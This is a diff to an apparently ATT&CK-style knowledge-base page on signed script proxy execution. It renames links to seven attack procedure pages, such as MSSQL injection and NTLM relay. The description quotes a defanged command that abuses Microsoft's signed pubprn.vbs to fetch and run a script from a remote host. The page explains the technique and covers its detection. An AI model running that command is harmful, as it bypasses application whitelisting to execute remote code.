@@ -10,13 +10,13 @@ tactics:
 - '[[Defense Evasion|TA0005 - Defense Evasion]]'
 - '[[Execution|TA0002 - Execution]]'
 procedures:
-- '[[Linked Database Query Execution]]'
-- '[[Linux - SSH Key Predictable PRNG Privilege Escalation]]'
-- '[[MSSQL Injection to Grant DBA Access]]'
-- '[[MSSQL OLE Automation Command Execution]]'
-- '[[Powershell Execution Policy for PowerView Commands]]'
-- '[[Ruby Server Side Template Injection - Code Execution]]'
-- '[[SMB and HTTP Relay Attack]]'
+- '[[Execute-Queries-via-Linked-SQL-Servers]]'
+- '[[Linux-SSH-Key-Predictable-PRNG-Privilege-Escalation]]'
+- '[[MSSQL-Injection-to-Grant-DBA-Access]]'
+- '[[MSSQL-OLE-Automation-Command-Execution]]'
+- '[[Bypass-PowerShell-Execution-Policy-for-PowerView]]'
+- '[[Ruby-Server-Side-Template-Injection-for-Code-Execution]]'
+- '[[Perform-NTLM-Relay-Attack-with-Responder-and-Impacket]]'
 ---
 
 # Signed Script Proxy Execution
@@ -26,6 +26,8 @@ procedures:
 ## Description
 
 Scripts signed with trusted certificates can be used to proxy execution of malicious files. This behavior may bypass signature validation restrictions and application whitelisting solutions that do not account for use of these scripts.PubPrn.vbs is signed by Microsoft and can be used to proxy execution from a remote site. [1] Example command: cscript C[:]\Windows\System32\Printing_Admin_Scripts\en-US\pubprn[.]vbs 127.0.0.1 script:http[:]//192.168.1.100/hi.pngThere are several other signed scripts that may be used in a similar manner. [2]
+
+
 
 # Detection
 
@@ -54,10 +56,12 @@ Certain signed scripts that can be used to execute other programs may not be nec
 
 ## Related Procedures (7)
 
-- [[Linked Database Query Execution]]
-- [[Linux - SSH Key Predictable PRNG Privilege Escalation]]
-- [[MSSQL Injection to Grant DBA Access]]
-- [[MSSQL OLE Automation Command Execution]]
-- [[Powershell Execution Policy for PowerView Commands]]
-- [[Ruby Server Side Template Injection - Code Execution]]
-- [[SMB and HTTP Relay Attack]]
+- [[Execute-Queries-via-Linked-SQL-Servers]]
+- [[Linux-SSH-Key-Predictable-PRNG-Privilege-Escalation]]
+- [[MSSQL-Injection-to-Grant-DBA-Access]]
+- [[MSSQL-OLE-Automation-Command-Execution]]
+- [[Bypass-PowerShell-Execution-Policy-for-PowerView]]
+- [[Ruby-Server-Side-Template-Injection-for-Code-Execution]]
+- [[Perform-NTLM-Relay-Attack-with-Responder-and-Impacket]]
+
+
